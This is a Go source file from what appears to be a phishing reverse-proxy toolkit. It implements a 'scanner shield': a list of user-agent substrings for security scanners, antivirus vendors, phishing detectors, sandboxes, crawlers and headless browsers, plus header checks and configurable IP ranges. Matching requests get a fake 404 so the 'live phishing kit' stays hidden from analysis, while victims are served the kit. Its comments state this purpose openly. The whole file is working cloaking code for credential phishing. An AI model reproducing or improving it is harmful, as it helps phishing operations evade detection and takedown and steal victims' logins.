package proxy

import (
	"net"
	"net/http"
	"strings"
	"sync"

	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/pkg/lures"
)

// scannerUASeeds are case-insensitive substrings that identify crawlers,
// security scanners, URL-sandbox detectors, and headless automation. Any
// request matching one of these must NEVER receive the live phishing kit — it
// gets a benign decoy instead so the lure stays hidden from automated analysis.
var scannerUASeeds = []string{
	// generic HTTP clients / libraries (URL scanners, link unfurlers, scripts)
	"curl", "wget", "libwww", "lwp", "python-requests", "python-urllib",
	"go-http-client", "okhttp", "java/", "jakarta", "apache-httpclient",
	"commons-httpclient", "http.client", "aiohttp", "scrapy", "pycurl",
	"powershell", "winhttp", "restsharp", "guzzle", "axios", "node-fetch",
	"undici", "php/", "libcurl", "http_request", "urllib",
	// active security scanners
	"nmap", "masscan", "zmap", "nuclei", "sqlmap", "wpscan", "nikto",
	"dirb", "gobuster", "ffuf", "feroxbuster", "wfuzz", "burp", "burpsuite",
	"owasp", "zap", "acunetix", "nessus", "nexpose", "openvas", "qualys",
	"rapid7", "tenable", "w3af", "wafw00f", "whatweb", "metasploit",
	"hydra", "fingerprint", "vulnscan", "netsparker", "appscan",
	// URL / phishing detectors & sandboxes
	"virustotal", "phishtank", "openphish", "phish", "urlscan", "censys",
	"shodan", "binaryedge", "greynoise", "securitytrails", "sophos",
	"mcafee", "kaspersky", "avast", "bitdefender", "norton", "trendmicro",
	"f-secure", "eset", "clamav", "crowdstrike", "sentinelone", "paloalto",
	"fortinet", "checkpoint", "cisco", "zscaler", "forcepoint", "bluecoat",
	"symantec", "safe-browsing", "google-safe", "googlebot", "bingbot",
	"yandexbot", "baiduspider", "duckduckbot", "slurp", "applebot",
	"embedly", "pinterest", "whatsapp", "telegrambot", "twitterbot",
	"linkedinbot", "slackbot", "discordbot", "dotbot", "semrush", "ahrefs",
	"mj12bot", "blexbot", "seznambot", "archive.org", "ia_archiver",
	"webcitation", "heritrix", "httrack", "teleport", "mail.ru",
	// headless browsers / automation frameworks
	"headless", "headlesschrome", "phantomjs", "puppeteer", "playwright",
	"selenium", "electron", "webdriver", "scrapbook",
	// generic crawler markers
	"crawler", "spider", "bot", "scan",
}

// scannerDecoyHTML is the benign page served to identified scanners/detectors.
// It mimics an inert 404 so automated link analysis sees nothing useful to flag
// and never loads the phishing kit.
const scannerDecoyHTML = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Not Found</title></head>
<body><h1>404 Not Found</h1><p>The requested resource was not found on this server.</p></body>
</html>`

// shieldMu guards the operator-configured scanner CIDR list.
var shieldMu sync.RWMutex

// scannerCIDRs holds operator-supplied IP ranges (CIDR strings) whose traffic is
// always decoyed as scanner infrastructure (e.g. known cloud/sandbox egress).
var scannerCIDRs []string

// SetScannerShield toggles the live scanner/detector shield.
func (e *Engine) SetScannerShield(v bool) { e.ScannerShield = v }

// AddScannerCIDR adds an IP range whose traffic is always decoyed.
func (e *Engine) AddScannerCIDR(cidr string) error {
	_, _, err := net.ParseCIDR(cidr)
	if err != nil {
		return err
	}
	shieldMu.Lock()
	scannerCIDRs = append(scannerCIDRs, cidr)
	shieldMu.Unlock()
	return nil
}

// ClearScannerCIDRs drops all operator-supplied scanner ranges.
func (e *Engine) ClearScannerCIDRs() {
	shieldMu.Lock()
	scannerCIDRs = nil
	shieldMu.Unlock()
}

// ScannerCIDRs returns a copy of the configured scanner ranges.
func (e *Engine) ScannerCIDRs() []string {
	shieldMu.RLock()
	defer shieldMu.RUnlock()
	out := make([]string, len(scannerCIDRs))
	copy(out, scannerCIDRs)
	return out
}

// isScannerRequest inspects the request for crawler/scanner/headless/automation
// fingerprints and returns whether the live kit should be withheld.
func isScannerRequest(r *http.Request) (bool, string) {
	ua := strings.ToLower(r.UserAgent())
	if ua == "" {
		return true, "missing user-agent"
	}
	for _, seed := range scannerUASeeds {
		if strings.Contains(ua, seed) {
			return true, "scanner user-agent: " + seed
		}
	}
	// Headless / automation fingerprints that masquerade as a browser.
	if strings.Contains(ua, "headless") || strings.Contains(ua, "webdriver") ||
		strings.Contains(ua, "phantom") || strings.Contains(ua, "puppeteer") ||
		strings.Contains(ua, "playwright") || strings.Contains(ua, "selenium") {
		return true, "headless automation user-agent"
	}
	// A genuine desktop/mobile browser always sends Accept-Language and a rich
	// Accept header. Browser-spoofing scanners usually omit them. Only enforce
	// this for requests that claim to be a browser (Mozilla/5.0) so we never
	// block a real victim on an unusual but legitimate client.
	if strings.Contains(ua, "mozilla/5.0") {
		if r.Header.Get("Accept-Language") == "" || r.Header.Get("Accept") == "" {
			return true, "browser-like UA missing standard headers"
		}
	}
	// Operator-configured scanner source ranges.
	if ip := net.ParseIP(lures.ClientIP(r)); ip != nil {
		shieldMu.RLock()
		for _, c := range scannerCIDRs {
			_, netw, err := net.ParseCIDR(c)
			if err == nil && netw.Contains(ip) {
				shieldMu.RUnlock()
				return true, "source in scanner CIDR: " + c
			}
		}
		shieldMu.RUnlock()
	}
	return false, ""
}

// serveScannerDecoy returns a benign 404 so automated link graders see nothing
// of the phishing kit.
func serveScannerDecoy(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusNotFound)
	_, _ = w.Write([]byte(scannerDecoyHTML))
}

// scannerGuard wraps a target handler so identified scanners/detectors receive a
// benign decoy instead of the live kit. It is applied independently of the lure
// guard, so even a scanner carrying a valid lure token is blocked.
func (e *Engine) scannerGuard(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if ok, reason := isScannerRequest(r); ok {
			log.Info("scanner shield: decoy served to %s (%s) for %s %s",
				lures.ClientIP(r), reason, r.Method, r.URL.Path)
			serveScannerDecoy(w, r)
			return
		}
		next.ServeHTTP(w, r)
	})
}
